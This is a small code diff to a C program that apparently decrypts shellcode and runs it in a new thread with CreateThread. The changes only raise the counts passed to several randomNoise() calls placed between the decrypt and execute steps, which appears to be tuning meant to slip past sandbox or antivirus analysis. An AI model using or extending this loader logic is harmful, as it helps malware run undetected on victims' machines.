@@ -250,7 +250,7 @@ int main() {
     }
 
     // Random noise
-    randomNoise(2);
+    randomNoise(1000);
 
     // Printing encrypted shellcode address and size of it.
     printf("[i] Bytes : 0x%p \n", Bytes);
@@ -297,7 +297,7 @@ int main() {
     }
 
     // Random noise
-    randomNoise(1);
+    randomNoise(3500);
 
     // Printing the decypted shellcode
     // Dont print large shellcodes 
@@ -331,7 +331,7 @@ int main() {
         return -1;
     }
     // Random noise
-    randomNoise(3);
+    randomNoise(1500);
     // Executing the shellcode
     // Running the shellcode as a new thread's entry 
     if (CreateThread(NULL, NULL, pShellcodeAddress, NULL, NULL, NULL) == NULL) {
@@ -351,4 +351,5 @@ int main() {
     getchar();
     */
 }
+
 
